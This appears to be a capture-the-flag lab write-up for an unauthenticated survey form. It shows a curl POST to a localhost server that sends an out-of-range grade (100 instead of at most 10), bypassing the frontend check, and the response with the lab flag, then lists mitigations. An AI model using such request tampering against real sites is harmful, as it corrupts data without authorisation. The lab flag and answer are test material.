## Exploit: Integer input validation
In the survey page, the inputs provided by the grade section are up to 10, and the form is submitted with a POST request to the server with the grade and the userid as the form body without any authentication.

![image](https://hackmd.io/_uploads/HyNuCNeQle.png)

It is possible to overflow this value by handcrafting the POST request with `curl`, bypassing the frontend restriction. The flag is sent in the response.

```
jun@jun-Latitude-5430:~/Downloads/Postman$ curl -X POST localhost:8080/index.php?page=survey      -H "Content-Type: application/x-www-form-urlencoded"      -d "sujet=2&valeur=100" | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<center><h2 style="margin-top:50px;"> The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <div style="margin-top:-75px">
100  6120    0  6102  100    18  4247k  12829 --:--:-- --:--:-- --:--:-- 5976k

```

> The flag is `03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa`

### Mitigations
- Only allow authenticated users to write to database
- Validate inputs for overflow in the backend business logic layer
